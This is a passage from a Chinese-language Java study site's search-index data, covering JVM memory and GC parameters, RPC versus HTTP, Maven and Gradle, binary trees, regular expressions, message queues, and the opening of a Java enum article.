1.概述    在本篇文章中，你将掌握最常用的 JVM 参数配置。如果对于下面提到了一些概念比如堆、\n2.堆内存相关     Java 虚拟机所管理的内存中最大的一块，Java 堆是所有线程共享的一块内存区域，在虚拟机启动时创建。此内存区域的唯一目的就是存放对象实例，几乎所有的对象实例以及数组都在这里分配内存。\n 2.1.显式指定堆内存–Xms和-Xmx    与性能有关的最常见实践之一是根据应用程序要求初始化堆内存。如果我们需要指定最小和最大堆大小（推荐显示指定大小），以下参数可以帮助你实现：\n-Xms\u0026lt;heap size\u0026gt;[unit] -Xmx\u0026lt;heap size\u0026gt;[unit]  heap size 表示要初始化内存的具体大小。 unit 表示要初始化内存的单位。单位为***“ g”*** (GB) 、***“ m”***（MB）、***“ k”***（KB）。  举个栗子🌰，如果我们要为JVM分配最小2 GB和最大5 GB的堆内存大小，我们的参数应该这样来写：\n-Xms2G -Xmx5G 2.2.显式新生代内存(Young Generation)    根据Oracle官方文档，在堆总可用内存配置完成之后，第二大影响因素是为 Young Generation 在堆内存所占的比例。默认情况下，YG 的最小大小为 1310 MB，最大大小为无限制。\n一共有两种指定 新生代内存(Young Ceneration)大小的方法：\n1.通过-XX:NewSize和-XX:MaxNewSize指定\n-XX:NewSize=\u0026lt;young size\u0026gt;[unit] -XX:MaxNewSize=\u0026lt;young size\u0026gt;[unit] 举个栗子🌰，如果我们要为 新生代分配 最小256m 的内存，最大 1024m的内存我们的参数应该这样来写：\n-XX:NewSize=256m -XX:MaxNewSize=1024m 2.通过-Xmn\u0026lt;young size\u0026gt;[unit] 指定\n举个栗子🌰，如果我们要为 新生代分配256m的内存（NewSize与MaxNewSize设为一致），我们的参数应该这样来写：\n-Xmn256m GC 调优策略中很重要的一条经验总结是这样说的：\n 将新对象预留在新生代，由于 Full GC 的成本远高于 Minor GC，因此尽可能将对象分配在新生代是明智的做法，实际项目中根据 GC 日志分析新生代空间大小分配是否合理，适当通过“-Xmn”命令调节新生代大小，最大限度降低新对象直接进入老年代的情况。\n 另外，你还可以通过**-XX:NewRatio=\u0026lt;int\u0026gt;**来设置新生代和老年代内存的比值。\n比如下面的参数就是设置新生代（包括Eden和两个Survivor区）与老年代的比值为1。也就是说：新生代与老年代所占比值为1：1，新生代占整个堆栈的 1/2。\n-XX:NewRatio=1 2.3.显式指定永久代/元空间的大小    从Java 8开始，如果我们没有指定 Metaspace 的大小，随着更多类的创建，虚拟机会耗尽所有可用的系统内存（永久代并不会出现这种情况）。\nJDK 1.8 之前永久代还没被彻底移除的时候通常通过下面这些参数来调节方法区大小\n-XX:PermSize=N //方法区 (永久代) 初始大小 -XX:MaxPermSize=N //方法区 (永久代) 最大大小,超过这个值将会抛出 OutOfMemoryError 异常:java.lang.OutOfMemoryError: PermGen 相对而言，垃圾收集行为在这个区域是比较少出现的，但并非数据进入方法区后就“永久存在”了。\nJDK 1.8 的时候，方法区（HotSpot 的永久代）被彻底移除了（JDK1.7 就已经开始了），取而代之是元空间，元空间使用的是本地内存。\n下面是一些常用参数：\n-XX:MetaspaceSize=N //设置 Metaspace 的初始（和最小大小） -XX:MaxMetaspaceSize=N //设置 Metaspace 的最大大小，如果不指定大小的话，随着更多类的创建，虚拟机会耗尽所有可用的系统内存。 3.垃圾收集相关    3.1.垃圾回收器    为了提高应用程序的稳定性，选择正确的垃圾收集算法至关重要。\nJVM具有四种类型的GC实现：\n 串行垃圾收集器 并行垃圾收集器 CMS垃圾收集器 G1垃圾收集器  可以使用以下参数声明这些实现：\n-XX:+UseSerialGC -XX:+UseParallelGC -XX:+UseParNewGC -XX:+UseG1GC 有关垃圾回收实施的更多详细信息，请参见此处。\n3.2.GC记录    为了严格监控应用程序的运行状况，我们应该始终检查JVM的垃圾回收性能。最简单的方法是以人类可读的格式记录GC活动。\n使用以下参数，我们可以记录GC活动：\n-XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=\u0026lt; number of log files \u0026gt; -XX:GCLogFileSize=\u0026lt; file size \u0026gt;[ unit ] -Xloggc:/path/to/gc.log 推荐阅读     CMS GC 默认新生代是多大？ CMS GC启动参数优化配置 从实际案例聊聊Java应用的GC优化-美团技术团队 JVM性能调优详解 （2019-11-11） JVM参数使用手册  "},{"id":352,"href":"/system-design/distributed-system/rpc/%E6%9C%8D%E5%8A%A1%E4%B9%8B%E9%97%B4%E7%9A%84%E8%B0%83%E7%94%A8%E4%B8%BA%E5%95%A5%E4%B8%8D%E7%9B%B4%E6%8E%A5%E7%94%A8HTTP%E8%80%8C%E7%94%A8RPC/","title":"服务之间的调用为啥不直接用HTTP而用RPC","parent":"rpc","content":"什么是 RPC?RPC原理是什么?    什么是 RPC？    RPC（Remote Procedure Call）—远程过程调用，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。比如两个不同的服务 A、B 部署在两台不同的机器上，那么服务 A 如果想要调用服务 B 中的某个方法该怎么办呢？使用 HTTP请求 当然可以，但是可能会比较慢而且一些优化做的并不好。 RPC 的出现就是为了解决这个问题。\nRPC原理是什么？     服务消费端（client）以本地调用的方式调用远程服务； 客户端 Stub（client stub） 接收到调用后负责将方法、参数等组装成能够进行网络传输的消息体（序列化）：RpcRequest； 客户端 Stub（client stub） 找到远程服务的地址，并将消息发送到服务提供端； 服务端 Stub（桩）收到消息将消息反序列化为Java对象: RpcRequest； 服务端 Stub（桩）根据RpcRequest中的类、方法、方法参数等信息调用本地的方法； 服务端 Stub（桩）得到方法执行结果并将组装成能够进行网络传输的消息体：RpcResponse（序列化）发送至消费方； 客户端 Stub（client stub）接收到消息并将消息反序列化为Java对象:RpcResponse ，这样也就得到了最终结果。  下面再贴一个网上的时序图，辅助理解：\nRPC 解决了什么问题？    从上面对 RPC 介绍的内容中，概括来讲RPC 主要解决了：让分布式或者微服务系统中不同服务之间的调用像本地调用一样简单。\n常见的 RPC 框架总结?     RMI（JDK自带）： JDK自带的RPC，有很多局限性，不推荐使用。 Dubbo: Dubbo是 阿里巴巴公司开源的一个高性能优秀的服务框架，使得应用可通过高性能的 RPC 实现服务的输出和输入功能，可以和 Spring框架无缝集成。目前 Dubbo 已经成为 Spring Cloud Alibaba 中的官方组件。 gRPC ：gRPC是可以在任何环境中运行的现代开源高性能RPC框架。它可以通过可插拔的支持来有效地连接数据中心内和跨数据中心的服务，以实现负载平衡，跟踪，运行状况检查和身份验证。它也适用于分布式计算的最后一英里，以将设备，移动应用程序和浏览器连接到后端服务。 Hessian： Hessian是一个轻量级的remoting on http工具，使用简单的方法提供了RMI的功能。 相比WebService，Hessian更简单、快捷。采用的是二进制RPC协议，因为采用的是二进制协议，所以它很适合于发送二进制数据。 Thrift： Apache Thrift是Facebook开源的跨语言的RPC通信框架，目前已经捐献给Apache基金会管理，由于其跨语言特性和出色的性能，在很多互联网公司得到应用，有能力的公司甚至会基于thrift研发一套分布式服务框架，增加诸如服务注册、服务发现等功能。  RPC学习材料     跟着 Guide 哥造轮子  既有 HTTP ,为啥用 RPC 进行服务调用?    RPC 只是一种设计而已    RPC 只是一种概念、一种设计，就是为了解决 不同服务之间的调用问题, 它一般会包含有 传输协议 和 序列化协议 这两个。\n但是，HTTP 是一种协议，RPC框架可以使用 HTTP协议作为传输协议或者直接使用TCP作为传输协议，使用不同的协议一般也是为了适应不同的场景。\nHTTP 和 TCP    可能现在很多对计算机网络不太熟悉的朋友已经被搞蒙了，要想真正搞懂，还需要来简单复习一下计算机网络基础知识：\n 我们通常谈计算机网络的五层协议的体系结构是指：应用层、传输层、网络层、数据链路层、物理层。\n应用层(application-layer）的任务是通过应用进程间的交互来完成特定网络应用。 HTTP 属于应用层协议，它会基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。HTTP协议工作于客户端-服务端架构上。浏览器作为HTTP客户端通过 URL 向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。HTTP协议建立在 TCP 协议之上。\n传输层(transport layer)的主要任务就是负责向两台主机进程之间的通信提供通用的数据传输服务。TCP是传输层协议，主要解决数据如何在网络中传输。相比于UDP,TCP 提供的是面向连接的，可靠的数据传输服务。\n RPC框架功能更齐全    成熟的 RPC框架还提供好了“服务自动注册与发现”、\u0026ldquo;智能负载均衡\u0026rdquo;、“可视化的服务治理和运维”、“运行期流量调度”等等功能，这些也算是选择 RPC 进行服务注册和发现的一方面原因吧！\n相关阅读：\n http://www.ruanyifeng.com/blog/2016/08/http.html （HTTP 协议入门- 阮一峰）  一个常见的错误观点    很多文章中还会提到说 HTTP 协议相较于自定义 TCP 报文协议，增加的开销在于连接的建立与断开，但是这个观点已经被否认，下面截取自知乎中一个回答，原回答地址：https://www.zhihu.com/question/41609070/answer/191965937 。\n 首先要否认一点 HTTP 协议相较于自定义 TCP 报文协议，增加的开销在于连接的建立与断开。HTTP 协议是支持连接池复用的，也就是建立一定数量的连接不断开，并不会频繁的创建和销毁连接。二一要说的是 HTTP 也可以使用 Protobuf 这种二进制编码协议对内容进行编码，因此二者最大的区别还是在传输协议上。\n "},{"id":353,"href":"/%E7%AC%94%E8%AE%B0/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/","title":"构建工具","parent":"笔记","content":"构建工具     构建工具  一、构建工具的作用 二、Java 主流构建工具 三、Maven 参考资料    一、构建工具的作用    构建一个项目通常包含了依赖管理、测试、编译、打包、发布等流程，构建工具可以自动化进行这些操作，从而为我们减少这些繁琐的工作。\n其中构建工具提供的依赖管理能够可以自动处理依赖关系。例如一个项目需要用到依赖 A，A 又依赖于 B，那么构建工具就能帮我们导入 B，而不需要我们手动去寻找并导入。\n在 Java 项目中，打包流程通常是将项目打包成 Jar 包。在没有构建工具的情况下，我们需要使用命令行工具或者 IDE 手动打包。而发布流程通常是将 Jar 包上传到服务器上。\n二、Java 主流构建工具    Ant 具有编译、测试和打包功能，其后出现的 Maven 在 Ant 的功能基础上又新增了依赖管理功能，而最新的 Gradle 又在 Maven 的功能基础上新增了对 Groovy 语言的支持。\n\nGradle 和 Maven 的区别是，它使用 Groovy 这种特定领域语言（DSL）来管理构建脚本，而不再使用 XML 这种标记性语言。因为项目如果庞大的话，XML 很容易就变得臃肿。\n例如要在项目中引入 Junit，Maven 的代码如下：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;jizg.study.maven.hello\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hello-first\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.0.1-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.10\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/project\u0026gt; 而 Gradle 只需要几行代码：\ndependencies { testCompile \u0026#34;junit:junit:4.10\u0026#34; } 三、Maven    概述    提供了项目对象模型（POM）文件来管理项目的构建。\n仓库    仓库的搜索顺序为：本地仓库、中央仓库、远程仓库。\n 本地仓库用来存储项目的依赖库； 中央仓库是下载依赖库的默认位置； 远程仓库，因为并非所有的依赖库都在中央仓库，或者中央仓库访问速度很慢，远程仓库是中央仓库的补充。  POM    POM 代表项目对象模型，它是一个 XML 文件，保存在项目根目录的 pom.xml 文件中。\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.12\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; [groupId, artifactId, version, packaging, classifier] 称为一个项目的坐标，其中 groupId、artifactId、version 必须定义，packaging 可选（默认为 Jar），classifier 不能直接定义的，需要结合插件使用。\n groupId：项目组 Id，必须全球唯一； artifactId：项目 Id，即项目名； version：项目版本； packaging：项目打包方式。  依赖原则    1. 依赖路径最短优先原则    A -\u0026gt; B -\u0026gt; C -\u0026gt; X(1.0) A -\u0026gt; D -\u0026gt; X(2.0) 由于 X(2.0) 路径最短，所以使用 X(2.0)。\n2. 声明顺序优先原则    A -\u0026gt; B -\u0026gt; X(1.0) A -\u0026gt; C -\u0026gt; X(2.0) 在 POM 中最先声明的优先，上面的两个依赖如果先声明 B，那么最后使用 X(1.0)。\n3. 覆写优先原则    子 POM 内声明的依赖优先于父 POM 中声明的依赖。\n解决依赖冲突    找到 Maven 加载的 Jar 包版本，使用 mvn dependency:tree 查看依赖树，根据依赖原则来调整依赖在 POM 文件的声明顺序。\n参考资料     POM Reference What is a build tool? Java Build Tools Comparisons: Ant vs Maven vs Gradle maven 2 gradle 新一代构建工具 gradle  "},{"id":354,"href":"/cs-basics/data-structure/%E6%A0%91/","title":"树","parent":"data-structure","content":"树    树就是一种类似现实生活中的树的数据结构（倒置的树）。任何一颗非空树只有一个根节点。\n一棵树具有以下特点：\n 一棵树中的任意两个结点有且仅有唯一的一条路径连通。 一棵树如果有 n 个结点，那么它一定恰好有 n-1 条边。 一棵树不包含回路。  下图就是一颗树，并且是一颗二叉树。\n如上图所示，通过上面这张图说明一下树中的常用概念：\n 节点 ：树中的每个元素都可以统称为节点。 根节点 ：顶层节点或者说没有父节点的节点。上图中 A 节点就是根节点。 父节点 ：若一个节点含有子节点，则这个节点称为其子节点的父节点。上图中的 B 节点是 D 节点、E 节点的父节点。 子节点 ：一个节点含有的子树的根节点称为该节点的子节点。上图中 D 节点、E 节点是 B 节点的子节点。 兄弟节点 ：具有相同父节点的节点互称为兄弟节点。上图中 D 节点、E 节点的共同父节点是 B 节点，故 D 和 E 为兄弟节点。 叶子节点 ：没有子节点的节点。上图中的 D、F、H、I 都是叶子节点。 节点的高度 ：该节点到叶子节点的最长路径所包含的边数。 节点的深度 ：根节点到该节点的路径所包含的边数 节点的层数 ：节点的深度+1。 树的高度 ：根节点的高度。  二叉树的分类    二叉树（Binary tree）是每个节点最多只有两个分支（即不存在分支度大于 2 的节点）的树结构。\n二叉树 的分支通常被称作“左子树”或“右子树”。并且，二叉树 的分支具有左右次序，不能随意颠倒。\n二叉树 的第 i 层至多拥有 2^(i-1) 个节点，深度为 k 的二叉树至多总共有 2^k-1 个节点\n满二叉树    一个二叉树，如果每一个层的结点数都达到最大值，则这个二叉树就是 满二叉树。也就是说，如果一个二叉树的层数为 K，且结点总数是(2^k) -1 ，则它就是 满二叉树。如下图所示：\n完全二叉树    除最后一层外，若其余层都是满的，并且最后一层或者是满的，或者是在右边缺少连续若干节点，则这个二叉树就是 完全二叉树 。\n大家可以想象为一棵树从根结点开始扩展，扩展完左子节点才能开始扩展右子节点，每扩展完一层，才能继续扩展下一层。如下图所示：\n完全二叉树有一个很好的性质：父结点和子节点的序号有着对应关系。\n细心的小伙伴可能发现了，当根节点的值为 1 的情况下，若父结点的序号是 i，那么左子节点的序号就是 2i，右子节点的序号是 2i+1。这个性质使得完全二叉树利用数组存储时可以极大地节省空间，以及利用序号找到某个节点的父结点和子节点，后续二叉树的存储会详细介绍。\n平衡二叉树    平衡二叉树 是一棵二叉排序树，且具有以下性质：\n 可以是一棵空树 如果不是空树，它的左右两个子树的高度差的绝对值不超过 1，并且左右两个子树都是一棵平衡二叉树。  平衡二叉树的常用实现方法有 红黑树、AVL 树、替罪羊树、加权平衡树、伸展树 等。\n在给大家展示平衡二叉树之前，先给大家看一棵树：\n你管这玩意儿叫树？？？\n没错，这玩意儿还真叫树，只不过这棵树已经退化为一个链表了，我们管它叫 斜树。\n如果这样，那我为啥不直接用链表呢?\n谁说不是呢？\n二叉树相比于链表，由于父子节点以及兄弟节点之间往往具有某种特殊的关系，这种关系使得我们在树中对数据进行搜索和修改时，相对于链表更加快捷便利。\n但是，如果二叉树退化为一个链表了，那么那么树所具有的优秀性质就难以表现出来，效率也会大打折，为了避免这样的情况，我们希望每个做 “家长”（父结点） 的，都 一碗水端平，分给左儿子和分给右儿子的尽可能一样多，相差最多不超过一层，如下图所示：\n二叉树的存储    二叉树的存储主要分为 链式存储 和 顺序存储 两种：\n链式存储    和链表类似，二叉树的链式存储依靠指针将各个节点串联起来，不需要连续的存储空间。\n每个节点包括三个属性：\n 数据 data。data 不一定是单一的数据，根据不同情况，可以是多个具有不同类型的数据。 左节点指针 left 右节点指针 right。  可是 JAVA 没有指针啊！\n那就直接引用对象呗（别问我对象哪里找）\n顺序存储    顺序存储就是利用数组进行存储，数组中的每一个位置仅存储节点的 data，不存储左右子节点的指针，子节点的索引通过数组下标完成。根结点的序号为 1，对于每个节点 Node，假设它存储在数组中下标为 i 的位置，那么它的左子节点就存储在 2 _ i 的位置，它的右子节点存储在下标为 2 _ i+1 的位置。\n一棵完全二叉树的数组顺序存储如下图所示：\n大家可以试着填写一下存储如下二叉树的数组，比较一下和完全二叉树的顺序存储有何区别：\n可以看到，如果我们要存储的二叉树不是完全二叉树，在数组中就会出现空隙，导致内存利用率降低\n二叉树的遍历    先序遍历    二叉树的先序遍历，就是先输出根结点，再遍历左子树，最后遍历右子树，遍历左子树和右子树的时候，同样遵循先序遍历的规则，也就是说，我们可以递归实现先序遍历。\n代码如下：\npublic void preOrder(TreeNode root){ if(root == null){ return; } system.out.println(root.data); preOrder(root.left); preOrder(root.right); } 中序遍历    二叉树的中序遍历，就是先递归中序遍历左子树，再输出根结点的值，再递归中序遍历右子树，大家可以想象成一巴掌把树压扁，父结点被拍到了左子节点和右子节点的中间，如下图所示：\n代码如下：\npublic void inOrder(TreeNode root){ if(root == null){ return; } inOrder(root.left); system.out.println(root.data); inOrder(root.right); } 后序遍历    二叉树的后序遍历，就是先递归后序遍历左子树，再递归后序遍历右子树，最后输出根结点的值\n代码如下：\npublic void postOrder(TreeNode root){ if(root == null){ return; } postOrder(root.left); postOrder(root.right); system.out.println(root.data); } "},{"id":355,"href":"/%E7%AC%94%E8%AE%B0/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","title":"正则表达式","parent":"笔记","content":"正则表达式     正则表达式  一、概述 二、匹配单个字符 三、匹配一组字符 四、使用元字符 五、重复匹配 六、位置匹配 七、使用子表达式 八、回溯引用 九、前后查找 十、嵌入条件 参考资料    一、概述    正则表达式用于文本内容的查找和替换。\n正则表达式内置于其它语言或者软件产品中，它本身不是一种语言或者软件。\n正则表达式在线工具\n二、匹配单个字符    . 可以用来匹配任何的单个字符，但是在绝大多数实现里面，不能匹配换行符；\n. 是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \\ 进行转义，即在 . 前面加上 \\ 。\n正则表达式一般是区分大小写的，但也有些实现不区分。\n正则表达式\nC.C2018 匹配结果\nMy name is CyC2018 .\n三、匹配一组字符    [ ] 定义一个字符集合；\n0-9、a-z 定义了一个字符区间，区间使用 ASCII 码来确定，字符区间在 [ ] 中使用。\n- 只有在 [ ] 之间才是元字符，在 [ ] 之外就是一个普通字符；\n^ 在 [ ] 中是取非操作。\n应用\n匹配以 abc 为开头，并且最后一个字母不为数字的字符串：\n正则表达式\nabc[^0-9] 匹配结果\n abcd abc1 abc2  四、使用元字符    匹配空白字符       元字符 说明     [\\b] 回退（删除）一个字符   \\f 换页符   \\n 换行符   \\r 回车符   \\t 制表符   \\v 垂直制表符    \\r\\n 是 Windows 中的文本行结束标签，在 Unix/Linux 则是 \\n。\n\\r\\n\\r\\n 可以匹配 Windows 下的空白行，因为它匹配两个连续的行尾标签，而这正是两条记录之间的空白行；\n匹配特定的字符    1. 数字元字符       元字符 说明     \\d 数字字符，等价于 [0-9]   \\D 非数字字符，等价于 [^0-9]    2. 字母数字元字符       元字符 说明     \\w 大小写字母，下划线和数字，等价于 [a-zA-Z0-9_]   \\W 对 \\w 取非    3. 空白字符元字符       元字符 说明     \\s 任何一个空白字符，等价于 [\\f\\n\\r\\t\\v]   \\S 对 \\s 取非    \\x 匹配十六进制字符，\\0 匹配八进制，例如 \\xA 对应值为 10 的 ASCII 字符 ，即 \\n。\n五、重复匹配     + 匹配 1 个或者多个字符 ** * 匹配 0 个或者多个字符 ? 匹配 0 个或者 1 个字符  应用\n匹配邮箱地址。\n正则表达式\n[\\w.]+@\\w+\\.\\w+ [\\w.] 匹配的是字母数字或者 . ，在其后面加上 + ，表示匹配多次。在字符集合 [ ] 里，. 不是元字符；\n匹配结果\nabc.def\u0026lt;span\u0026gt;@\u0026lt;/span\u0026gt;qq.com\n {n} 匹配 n 个字符 {m,n} 匹配 m~n 个字符 {m,} 至少匹配 m 个字符  * 和 + 都是贪婪型元字符，会匹配尽可能多的内容。在后面加 ? 可以转换为懒惰型元字符，例如 *?、+? 和 {m,n}? 。\n正则表达式\na.+c 匹配结果\nabcabcabc\n由于 + 是贪婪型的，因此 .+ 会匹配更可能多的内容，所以会把整个 abcabcabc 文本都匹配，而不是只匹配前面的 abc 文本。用懒惰型可以实现匹配前面的。\n六、位置匹配    单词边界    \\b 可以匹配一个单词的边界，边界是指位于 \\w 和 \\W 之间的位置；\\B 匹配一个不是单词边界的位置。\n\\b 只匹配位置，不匹配字符，因此 \\babc\\b 匹配出来的结果为 3 个字符。\n字符串边界    ^ 匹配整个字符串的开头，$ 匹配结尾。\n^ 元字符在字符集合中用作求非，在字符集合外用作匹配字符串的开头。\n分行匹配模式（multiline）下，换行被当做字符串的边界。\n应用\n匹配代码中以 // 开始的注释行\n正则表达式\n^\\s*\\/\\/.*$ \n匹配结果\n public void fun() {  // 注释 1  int a = 1;  int b = 2;  // 注释 2  int c = a + b; }  七、使用子表达式    使用 ( ) 定义一个子表达式。子表达式的内容可以当成一个独立元素，即可以将它看成一个字符，并且使用 * 等元字符。\n子表达式可以嵌套，但是嵌套层次过深会变得很难理解。\n正则表达式\n(ab){2,} 匹配结果\nababab\n| 是或元字符，它把左边和右边所有的部分都看成单独的两个部分，两个部分只要有一个匹配就行。\n正则表达式\n(19|20)\\d{2} 匹配结果\n 1900 2010 1020  应用\n匹配 IP 地址。\nIP 地址中每部分都是 0-255 的数字，用正则表达式匹配时以下情况是合法的：\n 一位数字 不以 0 开头的两位数字 1 开头的三位数 2 开头，第 2 位是 0-4 的三位数 25 开头，第 3 位是 0-5 的三位数  正则表达式\n((25[0-5]|(2[0-4]\\d)|(1\\d{2})|([1-9]\\d)|(\\d))\\.){3}(25[0-5]|(2[0-4]\\d)|(1\\d{2})|([1-9]\\d)|(\\d)) 匹配结果\n 192.168.0.1 00.00.00.00 555.555.555.555  八、回溯引用    回溯引用使用 \\n 来引用某个子表达式，其中 n 代表的是子表达式的序号，从 1 开始。它和子表达式匹配的内容一致，比如子表达式匹配到 abc，那么回溯引用部分也需要匹配 abc 。\n应用\n匹配 HTML 中合法的标题元素。\n正则表达式\n\\1 将回溯引用子表达式 (h[1-6]) 匹配的内容，也就是说必须和子表达式匹配的内容一致。\n\u0026lt;(h[1-6])\u0026gt;\\w*?\u0026lt;\\/\\1\u0026gt; 匹配结果\n \u0026lt;h1\u0026gt;x\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;x\u0026lt;/h2\u0026gt; \u0026lt;h3\u0026gt;x\u0026lt;/h1\u0026gt;  替换    需要用到两个正则表达式。\n应用\n修改电话号码格式。\n文本\n313-555-1234\n查找正则表达式\n(\\d{3})(-)(\\d{3})(-)(\\d{4}) 替换正则表达式\n在第一个子表达式查找的结果加上 () ，然后加一个空格，在第三个和第五个字表达式查找的结果中间加上 - 进行分隔。\n($1) $3-$5 结果\n(313) 555-1234\n大小写转换       元字符 说明     \\l 把下个字符转换为小写   \\u 把下个字符转换为大写   \\L 把\\L 和\\E 之间的字符全部转换为小写   \\U 把\\U 和\\E 之间的字符全部转换为大写   \\E 结束\\L 或者\\U    应用\n把文本的第二个和第三个字符转换为大写。\n文本\nabcd\n查找\n(\\w)(\\w{2})(\\w) 替换\n$1\\U$2\\E$3 结果\naBCd\n九、前后查找    前后查找规定了匹配的内容首尾应该匹配的内容，但是又不包含首尾匹配的内容。\n向前查找使用 ?= 定义，它规定了尾部匹配的内容，这个匹配的内容在 ?= 之后定义。所谓向前查找，就是规定了一个匹配的内容，然后以这个内容为尾部向前面查找需要匹配的内容。向后匹配用 ?\u0026lt;= 定义（注: JavaScript 不支持向后匹配，Java 对其支持也不完善）。\n应用\n查找出邮件地址 @ 字符前面的部分。\n正则表达式\n\\w+(?=@) 结果\nabc @qq.com\n对向前和向后查找取非，只要把 = 替换成 ! 即可，比如 (?=) 替换成 (?!) 。取非操作使得匹配那些首尾不符合要求的内容。\n十、嵌入条件    回溯引用条件    条件为某个子表达式是否匹配，如果匹配则需要继续匹配条件表达式后面的内容。\n正则表达式\n子表达式 (\\() 匹配一个左括号，其后的 ? 表示匹配 0 个或者 1 个。 ?(1) 为条件，当子表达式 1 匹配时条件成立，需要执行 ) 匹配，也就是匹配右括号。\n(\\()?abc(?(1)\\)) 结果\n (abc) abc (abc  前后查找条件    条件为定义的首尾是否匹配，如果匹配，则继续执行后面的匹配。注意，首尾不包含在匹配的内容中。\n正则表达式\n?(?=-) 为前向查找条件，只有在以 - 为前向查找的结尾能匹配 \\d{5} ，才继续匹配 -\\d{4} 。\n\\d{5}(?(?=-)-\\d{4}) 结果\n 11111 22222- 33333-4444  参考资料     BenForta. 正则表达式必知必会 [M]. 人民邮电出版社, 2007.  "},{"id":356,"href":"/%E7%AC%94%E8%AE%B0/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/","title":"消息队列","parent":"笔记","content":"消息队列     消息队列  一、消息模型  点对点 发布/订阅   二、使用场景  异步处理 流量削锋 应用解耦   三、可靠性  发送端的可靠性 接收端的可靠性   参考资料    一、消息模型    点对点    消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。\n\n发布/订阅    消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费。\n\n发布与订阅模式和观察者模式有以下不同：\n 观察者模式中，观察者和主题都知道对方的存在；而在发布与订阅模式中，生产者与消费者不知道对方的存在，它们之间通过频道进行通信。 观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布与订阅模式是异步的，生产者向频道发送一个消息之后，就不需要关心消费者何时去订阅这个消息，可以立即返回。  \n二、使用场景    异步处理    发送者将消息发送给消息队列之后，不需要同步等待消息接收者处理完毕，而是立即返回进行其它操作。消息接收者从消息队列中订阅消息之后异步处理。\n例如在注册流程中通常需要发送验证邮件来确保注册用户身份的合法性，可以使用消息队列使发送验证邮件的操作异步处理，用户在填写完注册信息之后就可以完成注册，而将发送验证邮件这一消息发送到消息队列中。\n只有在业务流程允许异步处理的情况下才能这么做，例如上面的注册流程中，如果要求用户对验证邮件进行点击之后才能完成注册的话，就不能再使用消息队列。\n流量削锋    在高并发的场景下，如果短时间有大量的请求到达会压垮服务器。\n可以将请求发送到消息队列中，服务器按照其处理能力从消息队列中订阅消息进行处理。\n应用解耦    如果模块之间不直接进行调用，模块之间耦合度就会很低，那么修改一个模块或者新增一个模块对其它模块的影响会很小，从而实现可扩展性。\n通过使用消息队列，一个模块只需要向消息队列中发送消息，其它模块可以选择性地从消息队列中订阅消息从而完成调用。\n三、可靠性    发送端的可靠性    发送端完成操作后一定能将消息成功发送到消息队列中。\n实现方法：在本地数据库建一张消息表，将消息数据与业务数据保存在同一数据库实例里，这样就可以利用本地数据库的事务机制。事务提交成功后，将消息表中的消息转移到消息队列中，若转移消息成功则删除消息表中的数据，否则继续重传。\n接收端的可靠性    接收端能够从消息队列成功消费一次消息。\n两种实现方法：\n 保证接收端处理消息的业务逻辑具有幂等性：只要具有幂等性，那么消费多少次消息，最后处理的结果都是一样的。 保证消息具有唯一编号，并使用一张日志表来记录已经消费的消息编号。  参考资料     Observer vs Pub-Sub 消息队列中点对点与发布订阅区别  "},{"id":357,"href":"/java/basis/%E7%94%A8%E5%A5%BDJava%E4%B8%AD%E7%9A%84%E6%9E%9A%E4%B8%BE%E7%9C%9F%E7%9A%84%E6%B2%A1%E6%9C%89%E9%82%A3%E4%B9%88%E7%AE%80%E5%8D%95/","title":"用好Java中的枚举真的没有那么简单","parent":"basis","content":" 最近重看 Java 枚举，看到这篇觉得还不错的文章，于是简单翻译和完善了一些内容，分享给大家，希望你们也能有所收获。另外，不要忘了文末还有补充哦！\nps: 这里发一篇枚举的文章，也是因为后面要发一篇非常实用的关于 SpringBoot 全局异常处理的比较好的实践，里面就用到了枚举。\n这篇文章由 JavaGuide 翻译，公众号: JavaGuide,原文地址：https://www.baeldung.com/a-guide-to-java-enums 。\n转载请注明上面这段文字。\n 1.概览    在本文中，我们将看到什么是 Java 枚举，它们解决了哪些问题以及如何在实践中使用 Java 枚举实现一些设计模式。\nenum关键字在 java5 